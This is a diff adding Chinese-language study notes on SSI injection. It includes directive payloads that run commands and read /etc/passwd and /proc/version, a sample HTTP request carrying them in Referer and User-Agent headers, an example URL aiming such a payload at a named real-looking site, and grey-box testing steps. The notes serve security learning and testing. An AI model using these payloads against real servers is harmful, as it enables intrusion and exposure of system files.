@@ -20,7 +20,23 @@ window：
 用于包含文件内容；
 <!--#exec cmd="ls" -->
 
-
+<!--#include virtual="/etc/passwd" -->
 例子： 
 http://hpc.ebn.co.kr/news/n_view.html?keys=<!--#include%20file="/etc/passwd"-->
 
+如何检测呢：
+如果在apache 服务器上支持.shtml 则说明有很大可能支持ssi命令的！ 如果没有.shtml 也不能说明不支持。
+
+也可以在信息头上这样标注： 
+如果Web 应用程序将使用这些数据建立一个动态产生的页面，在HTTP 头信息中也可以执行该注入：
+GET / HTTP/1.0
+Referer: <!--#exec cmd="/bin/ps ax"-->
+User-Agent: <!--#virtual include="/proc/version"-->
+
+灰盒测试： （相当于措施）
+1. 是否使用SSI 指令; 如果使用，web 服务器就启动了SSI 支持。这就导致SSI 注入至少成为需要调查的潜在问
+题;
+2. 用户输入、cookie 内容和HTTP 标题头在哪里处理；很快就能生成一张完整的输入变量清单；
+3. 如何处理输入、使用什幺样的过滤方式、应用程序不允许什幺样的字符通过、考虑了多少种编码方式。
+使用grep 执行这些步骤，找到源代码中的正确关键词(SSI 指令、CGI 环境变量、涉及用户输入的变量任务、过滤函
+数等等)。
